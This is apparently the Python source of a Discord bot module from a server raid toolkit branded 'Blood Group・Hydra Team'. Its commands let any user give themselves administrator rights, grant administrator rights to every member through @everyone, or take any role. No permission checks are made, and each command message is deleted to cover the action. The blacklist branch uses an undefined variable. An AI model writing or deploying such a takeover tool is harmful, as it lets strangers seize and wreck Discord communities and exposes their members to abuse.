# coding: utf-8
import os
import json
import discord
import subprocess
import datetime
from os import system, name
from discord.ext.commands.core import cooldown
from discord import Permissions

from discord.ext import (
    commands,
    tasks
)


class Roles_Commands(commands.Cog):

    def __init__(self, client):
        self.client = client


    # Give yourself a role with administrator rights
    @commands.command(aliases=['administrator', 'give_admin', 'admin_give'])
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def admin(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            guild = ctx.guild
            perms = discord.Permissions(administrator=True) 

            await guild.create_role(name="Administrator", permissions=perms) 
    
            role = discord.utils.get(ctx.guild.roles, name="Administrator") 
            user = ctx.message.author

            await user.add_roles(role) 
            await ctx.message.delete()

            embed = discord.Embed(
                title = 'Успешная выдача роли администратора.',
                description = f'''**{ctx.author} вам успешно выдана роль с правами администратора.**''',
                color = 0xb9b9b9
            )

            try:
                await ctx.author.send(embed=embed)
            except:
                pass


    # Grant administrator rights to all participants
    @commands.command(aliases=['eveyoneadmin', 'everyone_a', 'e_admin', 'e_a', 'all_admin', 'a_admin', 'all_a', "a_a"])
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def everyone_admin(self, ctx):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            role = discord.utils.get(ctx.message.guild.roles, name="@everyone")
            perms = discord.Permissions(administrator=True)

            await role.edit(permissions=perms)
            await ctx.message.delete()

            embed = discord.Embed(
                title = 'Успешная выдача роли администратора.',
                description = f'''{ctx.author} роли @everyone было выдано право администратора! Теперь все участники могут приглашать ботов, вносить изменения в сервер.''',
                color = 0xb9b9b9
            )
            await ctx.author.send(embed=embed)


    # Give yourself the mentioned role
    @commands.command(aliases=['give_role', 'g_role', 'give_r', 'g_r', 'role_give', 'r_give', 'r_g'])
    @commands.cooldown(1, 5, commands.BucketType.user)
    async def giverole(self, ctx, role: discord.Role):

        try:
            with open("json/black_list.json", 'r', encoding="utf-8") as black_listik:
                black_list = json.load(black_listik)
        except Exception as e: print(e)


        if ctx.author.id in black_list:
            try:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.author.send(embed=bl_embed)

            except:
                bl_embed = discord.Embed(
                    title = "❗ | Your account is blacklisted by the bot",
                    description = black_text,
                    color = 0xFF0000
                )
                bl_embed.set_footer(
                    icon_url = 'https://media.discordapp.net/attachments/1045645133003104270/1046444713546362921/image.png',
                    text = 'Blood Group・Hydra Team'
                )
                await ctx.send(embed=bl_embed)

        else:
            await ctx.message.delete()

            getrole = discord.utils.get(ctx.guild.roles, id=role.id)
            user = ctx.message.author

            await user.add_roles(role)

            embed = discord.Embed(
                title = '✅ | Успешная выдача роли',
                description = f'**{ctx.author} вам успешно выдана роль {getrole}**',
                color = 0xb9b9b9
            )
            await ctx.author.send(embed=embed)


def setup(client):
    client.add_cog(Roles_Commands(client))